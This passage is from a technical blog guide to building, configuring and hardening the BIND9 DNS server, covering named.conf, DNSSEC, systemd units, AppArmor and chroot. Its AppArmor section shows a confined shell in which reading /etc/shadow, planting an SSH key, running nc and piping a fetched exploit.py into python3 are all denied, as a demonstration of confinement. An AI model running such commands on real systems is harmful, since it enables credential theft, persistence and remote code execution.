create and use <code>/etc/named/</code> for the conf files, you'll need to be sure to change this in your AppArmor profile.</p> <pre><code>autoreconf -fi  # (only if building from the git repository)\n\n# Useful for in-place upgrades and new installs\nversion='stable'\n./configure --prefix=/usr/local/bind-$version --sysconfdir=/etc/bind --localstatedir='/var'\n\nmake\nsudo make install\n</code></pre> <p>To illustrate how <code>--sysconfdir</code> and <code>--localstatedir</code> affect bind, we can run <code>named -V</code>.</p> <pre><code>default paths:\nnamed configuration:  /etc/bind/named.conf          # --sysconfdir=/etc/bind\nrndc configuration:   /etc/bind/rndc.conf           # --sysconfdir=/etc/bind\nDNSSEC root key:      /etc/bind/bind.keys           # --sysconfdir=/etc/bind\nnsupdate session key: /var/run/named/session.key    # --localstatedir=/var\nnamed PID file:       /var/run/named/named.pid      # --localstatedir=/var\nnamed lock file:      /var/run/named/named.lock     # --localstatedir=/var\n</code></pre> <p>Optional: Backup any existing, currently installed binaries.</p> <pre><code># Backup existing binaries from package manager\nmkdir /usr/local/bind-pkg-mgr/{bin,sbin,lib} -p\nfor i in /usr/local/bind-$version/sbin/*; do cp /usr/sbin/$(basename $i) /usr/local/bind-pkg-mgr/sbin/; done\nfor i in /usr/local/bind-$version/bin/*; do cp /usr/bin/$(basename $i) /usr/local/bind-pkg-mgr/bin/; done\nsudo cp -r /usr/lib/named/* /usr/local/bind-pkg-mgr/lib/\n</code></pre> <p>Create symlinks to the new binaries to \"install\" them.</p> <pre><code># Symlink to new binaries compiled from source\nfor i in /usr/local/bind-$version/sbin/*; do sudo ln -f -s $i /usr/sbin; done\nfor i in /usr/local/bind-$version/bin/*; do sudo ln -f -s $i /usr/bin; done\nsudo rm -rf /usr/lib/named\nsudo ln -f -s /usr/local/bind-$version/lib /usr/lib/named\n</code></pre> <p>You will also need to manually create everything the prebuilt package typically installs if you're not updating an existing bind service:</p> <ul> <li><code>bind</code> (Ubuntu) /<code>named</code> (Fedora) user &amp; group, it's up to you to choose which, it doesn't matter</li> <li>Configuration files and folders, (chroot) paths</li> <li>Systemd service files</li> <li>AppArmor / SELinux policy</li> </ul> <p>All of this is covered below.</p>"},{"location":"blog/2024/07/19/material-dns-bind9-dns/#uninstall","title":"Uninstall","text":"<p>Follow these steps to uninstall and remove the built <code>named</code> binaries, for instance if you want to rebuild them with different configuration arguments.</p> <p>Stop <code>named</code> if it's running.</p> <pre><code>sudo systemctl stop named\n</code></pre> <p>Remove the built binaries from the prefix path.</p> <pre><code>sudo make uninstall\n</code></pre> <p>Remove any symlinks.</p> <pre><code>version='stable'\nfor i in /usr/local/bind-$version/sbin/*; do rm -f /usr/sbin/$(basename $i); done\nfor i in /usr/local/bind-$version/bin/*; do rm -f /usr/sbin/$(basename $i); done\nsudo rm -f /usr/lib/named\n</code></pre> <p>Restore the original binaries.</p> <pre><code>for i in /usr/local/bind-pkg-mgr/sbin/*; do rm -f /usr/sbin/$(basename $i); cp -f $i /usr/sbin/; done\nfor i in /usr/local/bind-pkg-mgr/bin/*; do rm -f /usr/bin/$(basename $i); cp -f $i /usr/bin/; done\nsudo mkdir /usr/lib/named\nsudo cp -r /usr/local/bind-pkg-mgr/lib/* /usr/lib/named/\n</code></pre> <p>Optional: Clean the project directory.</p> <pre><code>make clean\n</code></pre>"},{"location":"blog/2024/07/19/material-dns-bind9-dns/#initial-setup","title":"Initial Setup","text":"<p>To ensure bind9's <code>named</code> service is working out of the box after a fresh install:</p> UbuntuFedoraSource <p>Point your system to <code>bind</code>'s service on localhost.</p> <pre><code>sudo rm -f /etc/resolv.conf\necho 'nameserver 127.0.0.1' | sudo tee /etc/resolv.conf\n</code></pre> <p>If name resolution isn't working, and you see <code>RRSIG validity period has not begun resolving './DS/IN'</code>errors in <code>journalctl -u named</code>, ensure the date / time is correct.</p> <pre><code>sudo systemctl restart systemd-timesyncd\nsudo date --set=\"2024-01-31 12:00:00 PM PDT\"\n</code></pre> <p>Point your system to <code>bind</code>'s service on localhost.</p> <pre><code>sudo rm -f /etc/resolv.conf\necho 'nameserver 127.0.0.1' | sudo tee /etc/resolv.conf\n</code></pre> <p>If name resolution isn't working, and you see <code>RRSIG validity period has not begun resolving './DS/IN'</code>errors in <code>journalctl -u named</code>, ensure the date / time is correct.</p> <pre><code>sudo systemctl restart chronyd\nsudo date --set=\"2024-01-31 12:00:00 PM PDT\"\n</code></pre> <p>Add a user and group. If you built from source, it's your choice whether to pick <code>named</code> or <code>bind</code>.</p> <pre><code># Ubuntu default (not required)\nsudo groupadd bind\nsudo useradd -g bind --system -M -s /usr/sbin/nologin bind\n\n# Fedora default (best for compatability)\nsudo groupadd named\nsudo useradd -g named --system -M -s /usr/sbin/nologin named\n</code></pre>"},{"location":"blog/2024/07/19/material-dns-bind9-dns/#firewall","title":"Firewall","text":"<p><code>named</code> listens on 53/udp and 53/tcp as well as 953/tcp.</p> UbuntuFedora <pre><code># By application name\nsudo ufw allow bind9\n\n# Defined ports and protocols\nsudo ufw allow in on eth0 to any port 53 comment 'bind9'\n</code></pre> <pre><code>sudo firewall-cmd --add-service dns --permanent\nsudo firewall-cmd --reload\n</code></pre>"},{"location":"blog/2024/07/19/material-dns-bind9-dns/#namedconf","title":"named.conf","text":"<p>BIND9 is highly configurable. The options and deployments possible are kind of overwhelming, if you're more used to something like <code>unbound</code> or especially if you've stuck with <code>systemd-resolved</code>. This section shows the bare minimum required files to get <code>named</code> running as a fully functioning DNS service.</p> <ul> <li>BIND9  Documentation: Configuration File Reference</li> <li>ISC KB: How to check the default option values in named.conf</li> <li>Ubuntu Source: bind /etc Files</li> <li>Fedora Source: named.conf.sample</li> </ul> <p><code>named-checkconf</code> and <code>-C</code></p> <p>Similar to <code>unbound-checkconf</code> bind also has a tool called <code>named-checkconf</code> to validate the configuration file(s).</p> <p><code>named</code> also has <code>named -C</code> to dump a complete example of the default option values for <code>named.conf</code>.</p> <p>Create the directories for bind's working paths you define in In <code>named.conf</code>. This also depends on what you choose for <code>--localstatedir=\"...</code> during the build process. Remember that <code>/var/run</code> symlinks to <code>/run</code>so we need to make the following paths.</p> <pre><code># Assumes these are in named.conf, and everything else defined is within \"/var/cache/named\"\n#   pid-file \"/run/named/named.pid\";\n#   directory \"/var/cache/named\";\n\nbind_paths='/var/run/named\n/var/cache/named'\n\nfor path in $bind_paths; do\n    sudo mkdir $path\n    sudo chown -R bind:bind $path\ndone\n</code></pre> <p>Choosing an <code>/etc</code> File Path</p> <p>As mentioned above in the install section about build options, this depends on what you used for <code>--sysconfdir=</code> during the build process.</p> <pre><code>sudo mkdir /etc/bind\nsudo chown -R bind:bind /etc/bind\n</code></pre> <p>At minimum, we need two files to get <code>named</code> / bind running. Bind handles everything else (as of <code>BIND 9.18.26 (Extended Support Version) &lt;id:936d80b&gt;</code>).</p> <ul> <li>named.conf</li> <li>named.rfc1912.zones</li> </ul> <p>This is a combination of both Ubuntu and Fedora's defaults, with a few options from the BIND9 docs.</p> <pre><code>// named.conf\n\noptions {\n    pid-file \"/var/run/named/named.pid\";\n\n    directory          \"/var/cache/named\";\n    dump-file          \"/var/cache/named/data/cache_dump.db\";\n    statistics-file    \"/var/cache/named/data/named_stats.txt\";\n    memstatistics-file \"/var/cache/named/data/named_mem_stats.txt\";\n    secroots-file      \"/var/cache/named/data/named.secroots\";\n    recursing-file     \"/var/cache/named/data/named.recursing\";\n\n    listen-on port 53 { 127.0.0.1; };\n    listen-on-v6 port 53 { ::1; };\n\n    allow-query { localhost; };\n    allow-query-cache { localhost; };\n\n    recursion yes;\n\n    dnssec-validation auto;\n};\n\nzone \".\" IN {\n    type hint;\n    file \"/usr/share/dns/root.hints\"; // sudo apt install -y dns-root-data\n};\n\ninclude \"/etc/bind/named.rfc1912.zones\";\n</code></pre> <p>Next, the rfc1912.zones file.</p> <pre><code>// named.rfc1912.zones:\n//\n// Provided by Red Hat caching-nameserver package\n//\n// ISC BIND named zone configuration for zones recommended by\n// RFC 1912 section 4.1 : localhost TLDs and address zones\n// and https://tools.ietf.org/html/rfc6303\n// (c)2007 R W Franks\n//\n// See /usr/share/doc/bind*/sample/ for example named configuration files.\n//\n// Note: empty-zones-enable yes; option is default.\n// If private ranges should be forwarded, add\n// disable-empty-zone \".\"; into options\n//\n\nzone \"localhost.localdomain\" IN {\n    type primary;\n    file \"named.localhost\";\n    allow-update { none; };\n};\n\nzone \"localhost\" IN {\n    type primary;\n    file \"named.localhost\";\n    allow-update { none; };\n};\n\nzone \"1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.ip6.arpa\" IN {\n    type primary;\n    file \"named.loopback\";\n    allow-update { none; };\n};\n\nzone \"1.0.0.127.in-addr.arpa\" IN {\n    type primary;\n    file \"named.loopback\";\n    allow-update { none; };\n};\n\nzone \"0.in-addr.arpa\" IN {\n    type primary;\n    file \"named.empty\";\n    allow-update { none; };\n};\n</code></pre> <p>At this point you can run bind as the <code>bind</code> / <code>named</code> user.</p> <pre><code># -g runs bind in the foreground\nsudo /usr/local/bind-stable/sbin/named -g -L /tmp/bind.log -u bind\n</code></pre> <p>You can continue on to the following sections to build your <code>named.conf</code> file(s), or skip ahead to get this running through systemd.</p>"},{"location":"blog/2024/07/19/material-dns-bind9-dns/#dnssec","title":"DNSSEC","text":"<ul> <li>BIND9  Documentation: DNSSEC</li> </ul> <p>Querying</p> <p>You may have noticed <code>dnssec-validaton auto;</code> in the <code>named.conf</code> file. This tells bind to validate DNS using the built in trust anchor data (<code>bind.keys</code>) which is now just part of BIND9.</p> <p>You can manage your own keys by setting <code>dnssec-validation yes;</code>, however keep in mind you need to manually update the key to that subdomain when it's scheduled to rotate. This is something you might do for an internal domain, or a test network.</p> <p>DNSSEC History</p> <p>The BIND9 docs suggest setting this to <code>auto</code> for general use, as 90% of the top-level domains have now been signed since the root zone was signed in 2010. With the <code>bind.keys</code> data file built into the package, all of this can be handled automatically now.</p> <p>Replying</p> <p>BIND9 also has automated and manual options for Zone Signing. It's recommended to make this fully automatic outside of test networks and specific use cases.</p> <p>Zone Signing Example</p> <p>To sign a zone, add the <code>dnssec-policy</code> definition to a zone block in your conf files.</p> <pre><code>zone \"dnssec.example\" {\n    type primary;\n    file \"dnssec.example.db\";\n    dnssec-policy default;    \u2b05\ufe0f\n    inline-signing yes;\n};\n</code></pre> <p>There are then three files created for zone keys:</p> <ul> <li><code>Kdnssec.example.+013+12345.private</code> private key for generating sigatures</li> <li><code>Kdnssec.example.+013+12345.key</code> the public key for validating the signatures</li> <li><code>Kdnssec.example+013+12345.state</code> state file used to track key timings and perform rollovers</li> </ul> <p>The rest of the DNSSEC chapter covers details like defining the DNSSEC policy parameters, and more. This guide may be updated with examples of this in the future.</p>"},{"location":"blog/2024/07/19/material-dns-bind9-dns/#access-control","title":"Access Control","text":"<p><code>named</code> will listen on all interfaces by default on Ubuntu and only localhost (<code>::1</code>,<code>127.0.0.1</code>) on Fedora. Define ACL's to limit what resources can access the bind server.</p> UbuntuFedora <p>Define ACL's in <code>/etc/bind/named.conf.options</code>.</p> <pre><code>acl \"trusted\" {\n        ::1;\n        127.0.0.1;\n        10.55.55.0/24;\n};\n\noptions {\n        listen-on port 53 { 127.0.0.1; 10.55.55.29; };\n        listen-on-v6 port 53 { ::1; 10.55.55.29; };\n        allow-query     { trusted; };\n        allow-recursion { trusted; };\n&lt;SNIP&gt;\n</code></pre> <p>Define ACL's in <code>/etc/named.conf</code>.</p> <pre><code>acl \"trusted\" {\n        ::1;\n        127.0.0.1;\n        10.55.55.0/24;\n};\n\noptions {\n        listen-on port 53 { 127.0.0.1; 10.55.55.29; };\n        listen-on-v6 port 53 { ::1; 10.55.55.29; };\n        allow-query     { trusted; };\n        allow-recursion { trusted; };\n&lt;SNIP&gt;\n</code></pre>"},{"location":"blog/2024/07/19/material-dns-bind9-dns/#logging","title":"Logging","text":"<p>The logging statement configures the channel (output method) and category (classes of messages) to be logged. Only one logging statement is used to define as many channels and categories as desired. If there is no logging statement, a built in default configuration is used.</p> <p>Query logging can be enabled for <code>bind</code>/<code>named</code> with the following block.</p> <p>First create the log file path with the correct ownership and permissions.</p> <pre><code>sudo mkdir -p /var/log/named\nsudo touch /var/log/named/query.log\nsudo chown -R bind:bind /var/log/named\n</code></pre> <p>AppArmor Compatability</p> <p>AppArmor lists the following paths for logging.</p> <pre><code>/var/log/named/** rw,\n/var/log/named/ rw,\n</code></pre> <p>Use these, or modify the AppArmor policy to point to <code>/var/log/bind</code> instead.</p> <p>Add or include the following logging block in <code>named.conf</code>.</p> <pre><code>logging {\n    // https://bind9.readthedocs.io/en/latest/reference.html\n    // The channel defines the file to send messages to\n    channel query_channel {\n        file \"/var/log/bind/query.log\" versions 8 size 8m suffix increment;\n        print-category yes; // Includes category in logs\n        print-severity yes; // Includes severity in logs\n        print-time yes; // Includes a timestamp in logs (iso8601 | iso8601-utc | local | &lt;boolean&gt;)\n        severity info; // info is the default and lowest log level, meaning everything gets logged\n\n        // Tells named to write to syslog as a specific syslog facility (your choice)\n        // You must choose either syslog, or writing to a file, not both\n        //syslog [&lt;syslog_facility&gt;];  // Options include daemon, syslog, kern, and many more\n    };\n    // The category defines *what* is sent to the log file, there can be multiple defined\n    // https://bind9.readthedocs.io/en/latest/reference.html#namedconf-statement-category\n    category queries { query_channel; };\n    category query-errors { query_channel; };\n    category security { query_channel; };\n    category dnssec { query_channel; };\n};\n</code></pre>"},{"location":"blog/2024/07/19/material-dns-bind9-dns/#dnstap","title":"dnstap","text":"<p>The RHEL 9 documentation covers recording DNS queries using <code>dnstap</code>. Requires <code>bind-9.16.15-3</code> or later. This won't be covered here for now, as it isn't always available.</p>"},{"location":"blog/2024/07/19/material-dns-bind9-dns/#dns-over-tls","title":"DNS over TLS","text":"<p>This section focuses on making queries over TLS, not running a server that accepts DNS over TLS</p> <p>Minimum Version Requirements</p> <p>Only certain recent versions of BIND9 (9.19+) have this capability. Interestingly the absolute latest version available did not have this feature enabled at the time of writing. You can easily test this by checking out a specific version, compiling the binaries, and running <code>named-checkconf</code> to assess the example blocks below. If it throws an error, DNS over TLS isn't supported in that build.</p> <ul> <li>BIND9: named.conf Forwarders</li> <li>How to use DNS over TLS with BIND9 Forwarders</li> <li>gitlab.isc.org: merge Resolve \"Forward queries via DoT\"</li> </ul> <p>According to the git history, this feature will be available in versions 9.19 or later, and by default in 9.20 stable.</p> <p>Cloudflare</p> <ul> <li>View the CA used for DNS over TLS with kdig</li> <li>BIND9: tls block example</li> </ul> <p>The tls block in <code>named.conf</code> requires a .pem file for the CA related to the hostname we're using. Without this, there's no way to verify the hostname is actually who they say they are. We need to know what certificate authority to point to in the <code>tls</code> block of the configuraiton file. It's possible to view the certificate used for Cloudflare by checking the returned CN with <code>kdig</code>.</p> <pre><code>dnf install knot-utils\nkdig -d @1.1.1.1 +tls-ca +tls-host=one.one.one.one example.com | grep CN\n</code></pre> <p>Example configuration blocks:</p> <pre><code>// https://bind9.readthedocs.io/en/latest/reference.html#tls-block-grammar\n// You can define multiple tls blocks, one for every provider\ntls Cloudflare {\n    ca-file \"/etc/ssl/certs/DigiCert_Global_Root_G2.pem\";\n    remote-hostname \"one.one.one.one\";\n};\n#tls Quad9 {\n#   ca-file \"/etc/ssl/certs/?\";\n#   remote-hostname \"dns.quad9.net\";\n#};\n\noptions {\n    // https://bind9.readthedocs.io/en/latest/reference.html#namedconf-statement-forwarders\n    forwarders {\n        1.1.1.1 port 853 tls Cloudflare;\n        1.0.0.1 port 853 tls Cloudflare;\n        2606:4700:4700::1111 port 853 tls Cloudflare;\n        2606:4700:4700::1001 port 853 tls Cloudflare;\n\n#       9.9.9.9 port 853 tls Quad9;\n    };\n};\n</code></pre> <p>Quad9's CA File</p> <p>It's unclear which (if any) of the CA files from the <code>ca-certificates</code> package will work for Quad9. The returned string is <code>CN=DigiCert TLS Hybrid ECC SHA384 2020 CA1</code> which the closest match on Fedora is <code>DigiCert_TLS_ECC_P384_Root_G5.pem</code>. However this CA doesn't work, and breaks name resolution.</p>"},{"location":"blog/2024/07/19/material-dns-bind9-dns/#systemd-service","title":"Systemd Service","text":"<p>Now that we have bind functioning and configured, we can create a service file so it will run automatically.</p> <p>Daemon Security</p> <p>At this point in the guide, the only hardening feature implemented is dropping privileges from root to the <code>bind</code> / <code>named</code> user via <code>-u</code>. You'll want to implement one of the security options when finally using bind in a production sense.</p> <p>Create the systemd service file. This assumes you've been following the recommendation of creating symlinks in <code>/usr/{sbin,bin}</code> to your <code>make install</code> path.</p> <ul> <li><code>EnvironmentFile=-$sysconfdir/default/named</code> is Ubuntu specific</li> <li>Fedora uses <code>EnvironmentFile=-$sysconfdir/sysconfig/named</code></li> <li>The entire block below is meant to be safe to copy and paste over the previous files for version testing</li> </ul> <pre><code># Change these as needed, especially if there's a chroot path (default is no chroot)\nenvfilepath='default' # Ubuntu=default, Fedora=sysconfig\n\nif (systemctl is-active named); then sudo systemctl stop named; fi\n\nsleep 3\n\necho \"[Unit]\nDescription=BIND Domain Name Server\nDocumentation=man:named(8)\nAfter=network.target\nWants=nss-lookup.target\nBefore=nss-lookup.target\n\n[Service]\nType=forking\nEnvironmentFile=-/etc/$envfilepath/named\nExecStart=/usr/sbin/named \\$OPTIONS\nExecReload=/usr/sbin/rndc reload\nExecStop=/usr/sbin/rndc stop\nRestart=on-failure\n\n[Install]\nWantedBy=multi-user.target\nAlias=bind9.service\" | sudo tee /lib/systemd/system/named.service\n\nsudo mkdir /etc/default\necho '# run resolvconf?\nRESOLVCONF=no\n\n# startup options for the server\nOPTIONS=\"-u bind\"' | sudo tee /etc/$envfilepath/named\n\nsudo systemctl daemon-reload\nsudo systemctl enable named\nsudo systemctl restart named\n\nsystemctl status named\n\n# It should find these\necho \"\"\necho \"[*]cache Files\"\nfind /var/cache/named -type f\necho \"\"\necho \"[*]--localstatedir Files\"\nfind /var/run/named -type f\n</code></pre>"},{"location":"blog/2024/07/19/material-dns-bind9-dns/#environment-file","title":"Environment File","text":"<p>The script block above created the default environment file, with only the <code>-u bind</code> option. More options can be defined here.</p> <ul> <li>Ubuntu: <code>/etc/default/named</code></li> <li>Fedora: <code>/etc/sysconfig/named</code></li> </ul> <p>IPv4 or IPv6 Only</p> <p>To run only IPv4 or IPv6 (meaning not both), the <code>-4</code> or <code>-6</code> arguments must be passed to <code>named</code>.</p> <pre><code># Only use IPv6\nOPTIONS=\"-u bind -6\"\n</code></pre>"},{"location":"blog/2024/07/19/material-dns-bind9-dns/#security","title":"Security","text":"<p>Hardening the bind9 / <code>named</code> process itself (meaning outside of its runtime configuration) can take one of three approaches; AppArmor, SELinux, or chroot.</p>"},{"location":"blog/2024/07/19/material-dns-bind9-dns/#apparmor","title":"AppArmor","text":"<p>On Debian-based systems (Ubuntu) bind9 ships an AppArmor policy that's enabled by default.</p> <p>You could obtain this policy from the debian source package.</p> <pre><code>sudo sed -i_bkup 's/# deb-src/deb-src/g' /etc/apt/sources.list\nsudo apt update\n\ncd ~/src\napt download bind9\ndpkg-deb -x ./bind9_1%3a9.18.24-0ubuntu0.22.04.1_amd64.deb bind9-deb\ncd bind9-deb/etc/apparmor.d/\n</code></pre> <p>You can also obtain a copy of the policy file directly from Ubuntu's git repo (change the Ubuntu version to match yours).</p> <pre><code>cd ~/src/bind9  # Change into the bind9 upstream git folder\ncurl -Lf 'https://git.launchpad.net/ubuntu/+source/bind9/plain/debian/extras/apparmor.d/usr.sbin.named?h=ubuntu/jammy-devel' &gt; usr.sbin.named\n</code></pre> <p>Create a local override so <code>named</code> can access either <code>/var/cache/{bind,named}</code>, whichever one exists. You could also manually edit <code>usr.sbin.named</code> to make this change, it's up to you.</p> <pre><code>echo '# Local overrides for usr.sbin.named\n  /var/cache/named/** lrw,\n  /var/cache/named/ rw,' | sudo tee /etc/apparmor.d/local/usr.sbin.named\n</code></pre> <p>AppArmor Includes</p> <p>In any case, if the main <code>usr.sbin.named</code> AppArmor profile includes <code>local/usr.sbin.named</code>, you will at least need to <code>touch</code> that path to ensure it exists.</p> <pre><code>sudo touch /etc/apparmor.d/local/usr.sbin.named\n</code></pre> <p>Finally, install the AppArmor profile and reload both AppArmor and named to ensure everything works.</p> <pre><code>sudo cp ./usr.sbin.named /etc/apparmor.d/\n\n# Load the new profile into AppArmor\nsudo apparmor_parser -a /etc/apparmor.d/usr.sbin.named\n\n# Ensure everything works, use `journalctl -xeu named` to diagnose any errors\nsudo systemctl restart named\nsystemctl status named  # Should have no errors\necho \"\"\necho \"[*]AppArmor Status\"\nsudo aa-status | grep named\n</code></pre> <p>To disable the profile:</p> <pre><code>sudo ln -s /etc/apparmor.d/usr.sbin.named /etc/apparmor.d/disable/usr.sbin.named\nsudo apparmor_parser -R /etc/apparmor.d/usr.sbin.named\n</code></pre> <p>To remove the profile completely:</p> <pre><code>sudo apparmor_parser -R /etc/apparmor.d/usr.sbin.named\nfind /etc/apparmor.d/ -name 'usr.sbin.named' -print0 | xargs -0 sudo rm -f\n</code></pre> <p>This profile locks <code>named</code>'s ability to access or modify data to the following paths (where <code>lrw</code> means read,write,link).</p> <pre><code>  /var/lib/bind/** rw,\n  /var/lib/bind/ rw,\n  /var/cache/bind/** lrw,\n  /var/cache/bind/ rw,\n  /var/cache/bind/_default.nzd-lock rwk,\n  /var/lib/dnscvsutil/compiled/** rw,\n  owner @{PROC}/@{pid}/task/@{tid}/comm rw,\n  /{,var/}run/named/named.pid w,\n  /{,var/}run/named/session.key w,\n  /var/log/named/** rw,\n  /var/log/named/ rw,\n  /{,var/}run/slapd-*.socket rw,\n  /var/tmp/DNS_* rw,\n  /var/lib/samba/bind-dns/dns/** rwk,\n  /var/lib/samba/private/dns/** rwk,\n  /dev/urandom rwmk,\n  owner /var/tmp/krb5_* rwk,\n  /var/lib/sss/pipes/nss  rw,\n  @{run}/.nscd_socket   rw,\n  @{run}/nscd/socket    rw,\n  @{run}/avahi-daemon/socket rw,\n</code></pre> <p>Reviewing Confinement</p> <ul> <li><code>aa-exec</code> manpage</li> </ul> <p>AppArmor has a tool called <code>aa-exec</code> that allows you to run a process under the confinement of a (currently loaded) profile. When asking ChatGPT if there's a similar method for AppArmor to using <code>snap run --shell firefox</code> or <code>flatpak run --command=bash firefox</code> to explore what the snap/flatpak-confined firefox process can see and do, it pointed to <code>aa-exec</code>. This is essentially the same thing, allowing you to explore the AppArmor confinement of regular deb packages that have a profile.</p> <p>Ensure the profile is loaded into AppAmor.</p> <pre><code>sudo apparmor_parser -a /etc/apparmor.d/usr.sbin.named\n</code></pre> <p>Specify the profile name based on what <code>sudo aa-status</code> returns for that executable. For example you would use <code>named</code> and not <code>usr.sbin.named</code> here. To open a <code>bash</code> shell in <code>named</code>'s AppArmor profile:</p> <pre><code>sudo aa-exec -p named -- /bin/bash\n</code></pre> <p>This results in a bash process confined by the <code>usr.sbin.named</code> profile.</p> <pre><code>server@ubuntu2404:~$ sudo aa-exec -p named -- /bin/bash\nbash: /etc/bash.bashrc: Permission denied\nbash: /root/.bashrc: Permission denied\nbash-5.1#\nbash-5.1# cat /etc/shadow\nbash: /usr/bin/cat: Permission denied\nbash-5.1#\nbash-5.1# echo 'bad-key' &gt;&gt; /root/.ssh/authorized_keys\nbash: /root/.ssh/authorized_keys: Permission denied\nbash-5.1#\nbash-5.1# sh -c whoami\nbash: /usr/bin/sh: Permission denied\nbash-5.1# bash\nbash: /usr/bin/bash: Permission denied\nbash-5.1#\nbash-5.1# nc\nbash: /usr/bin/nc: Permission denied\nbash-5.1#\nbash-5.1# curl http://127.0.0.1:8080/exploit.py | python3\nbash: /usr/bin/python3: Permission denied\nbash: /usr/bin/curl: Permission denied\nbash-5.1#\nbash-5.1# touch /tmp/test.txt\nbash: /usr/bin/touch: Permission denied\n</code></pre>"},{"location":"blog/2024/07/19/material-dns-bind9-dns/#selinux","title":"SELinux","text":"<p>\u26a0\ufe0f TO DO, check back later!</p>"},{"location":"blog/2024/07/19/material-dns-bind9-dns/#chroot-and-setuid","title":"chroot and setuid","text":"<p>This option comes with a number of caveats.</p> <p>Chroot vs Mandatory Access Control</p> <p>The RHEL 9 documentation suggests using a mandatory access control mechanism like SELinux or AppArmor is more robust than a chroot jail. Only use this method if you cannot use AppArmor of SELinux.</p> <p>Additionally, if you want to use AppArmor on top of a chroot environment, you will need to modify the AppArmor profile to use the chroot base path.</p> <p>bind-chroot.x86_64</p> <p>This functionality is available as an rpm package, <code>bind-chroot</code> (on Fedora) and <code>named-chroot</code> (on RHEL).</p> <ul> <li>BIND9  Documentation: Chroot and Setuid</li> <li>Ubuntu Community: Chrooting BIND9</li> </ul> <p>The chroot environment</p> <p>Unlike with earlier versions of BIND, named does not typically need to be compiled statically, nor do shared libraries need to be installed under the new root. However, depending on the operating system, it may be necessary to set up locations such as <code>/dev/zero</code>, <code>/dev/random</code>, <code>/dev/log</code>, and <code>/etc/localtime</code>.</p> <p>Building on What Exists</p> <p>The Fedora repo for bind contains a number of files you could use to script setting up a chroot instance.</p> <ul> <li>named-chroot-setup.service, executes <code>setup-named-chroot.sh</code>, <code>After=named-setup-rndc.service</code></li> <li>setup-named-chroot.sh, this creates the necessary directories on Fedora using named-chroot.files</li> <li>named-chroot.service, the main service file, running <code>named</code> in a chroot environment</li> <li>named-setup-rndc.service, executes <code>generate-rndc-key.sh</code></li> <li>generate-rndc-key.sh, generates <code>/etc/rndc.key</code> if doesn't exist AND if there is no <code>rndc.conf</code></li> </ul> <p>Without a kernel-based mandatory access control system, you can still chroot the <code>bind</code>/<code>named</code> process into its own \"sandbox\" directory, and run bind unprivileged with <code>-u &lt;user&gt;</code>.</p> <p>Setting Up the Chroot</p> <p>To do this as simply as possible on Ubuntu, start by making the chroot paths:</p> <pre><code># Add any paths you use that are missing here\nsudo mkdir -p /chroot/bind/{etc/{bind,default},var/{cache/named/data,run/named,log/bind},usr/share/dns}\nfind /chroot/ -type d\n# The bind user can only write to /chroot/bind/var, read the rest\nsudo chown -R root:bind /chroot/bind\nsudo chown -R bind:bind /chroot/bind/var\n</code></pre> <p>Note that you don't need to copy any libraries or other binaries into the chroot, only files <code>named</code> will read or write to.</p> <p>Copy the existing configuration files over.</p> <pre><code>sudo cp /etc/bind/* /chroot/bind/etc/bind/\nsudo cp /etc/default/named /chroot/bind/etc/default/\nsudo cp /usr/share/dns/root.hints /chroot/bind/usr/share/dns/\n</code></pre> <p>For compatability, we'll create a separate Systemd service called named-chroot.</p> <pre><code>envfilepath='default' # Ubuntu=default, Fedora=sysconfig\n\necho \"[Unit]\nDescription=BIND Domain Name Server (Chroot)\nDocumentation=man:named(8)\nAfter=network.target\nWants=nss-lookup.target\nBefore=nss-lookup.target\n\n[Service]\nType=forking\nEnvironmentFile=-/etc/$envfilepath/named\nExecStart=/usr/sbin/named \\$OPTIONS -t /chroot/bind\nExecReload=/usr/sbin/rndc reload\nExecStop=/usr/sbin/rndc stop\nRestart=on-failure\n\n[Install]\nWantedBy=multi-user.target\nAlias=bind9-chroot.service\" | sudo tee /lib/systemd/system/named-chroot.service\n</code></pre> <p>Stop the non-chroot service, then start the chroot service.</p> <pre><code>sudo systemctl stop named\nsudo systemctl start named-chroot\nsystemctl status named-chroot\n\necho \"\"\necho \"[*]Chroot runtime files\"\nfind /chroot/ -type f\n</code></pre> <p><code>named</code> is now running in a chroot.</p> <p>Reviewing Confinement</p> <ul> <li>GNU Manual: Coreutils/Chroot</li> <li>HackTricks: Chroot Escapes</li> </ul> <p>You can interactively explore a chroot environment with the <code>chroot &lt;path&gt;</code> command. Specify the <code>&lt;path&gt;</code> to your chroot, then a command or shell to execute. If you don't specify a shell, it defaults to <code>/bin/sh -i</code>.</p> <p>man chroot</p> <p>If no command is given, run '\"$SHELL\" -i' (default: '/bin/sh -i').</p> <p>You can see below with the chroot created for bind, there aren't any binaries available to execute. There's no way to explore this interactively in our case, which is exactly what we want. For reference, <code>find</code> was used to list all avaialble files under the chroot. Assume that a rogue <code>named</code> process could at the very least \"see\" these files, which is fine.</p> <pre><code>server@ubuntu2404:~$ sudo chroot /chroot/bind\nchroot: failed to run command \u2018/bin/bash\u2019: No such file or directory\nserver@ubuntu2404:~$\nserver@ubuntu2404:~$ sudo find /chroot/ -type f\n/chroot/bind/etc/bind/named.conf\n/chroot/bind/etc/bind/rndc.key\n/chroot/bind/etc/bind/named.rfc1912.zones\n/chroot/bind/etc/bind/bind.keys\n/chroot/bind/etc/bind/rndc.conf\n/chroot/bind/usr/share/dns/root.hints\n/chroot/bind/var/run/named/session.key\n/chroot/bind/var/run/named/named.pid\n/chroot/bind/var/cache/named/managed-keys.bind\n/chroot/bind/var/cache/named/managed-keys.bind.jnl\n</code></pre>"},{"location":"blog/2024/07/19/material-dns-bind9-dns/#administration","title":"Administration","text":"<ul> <li>BIND9 Administrative Tools</li> </ul> <p>First create an <code>rndc.key</code> file.</p> <pre><code>sudo rndc-confgen -a\n</code></pre> <p>This file holds the shared secret used to connect to the server, in our case localhost. You'll need to make sure <code>named</code> can read this file. If you're running as <code>-u bind</code> this means something like:</p> <pre><code># Remember to copy these into the chroot if you're using one\nsudo chown root:bind /etc/bind/rndc.key\nsudo chmod 640 /etc/bind/rndc.key\n</code></pre> <p>Then write a conf file, including the <code>rndc.key</code> file.</p> <pre><code>// https://bind9.readthedocs.io/en/stable/chapter4.html#rndcconf-statement-options\necho 'options {\n    default-key rndc-key;\n    default-port 953;\n    default-server \"localhost\";\n};\n\ninclude \"/etc/bind/rndc.key\"' | sudo tee /etc/bind/rndc.conf\n</code></pre> <p>Restart <code>named</code> to load the key.</p> <pre><code>sudo systemctl restart named\n</code></pre> <p>Diagnosing a misbehaving BIND server is detailed here.</p> <pre><code>rndc status         # Obtain a snapshot of `named`'s status\n\nrndc recursing      # Generate 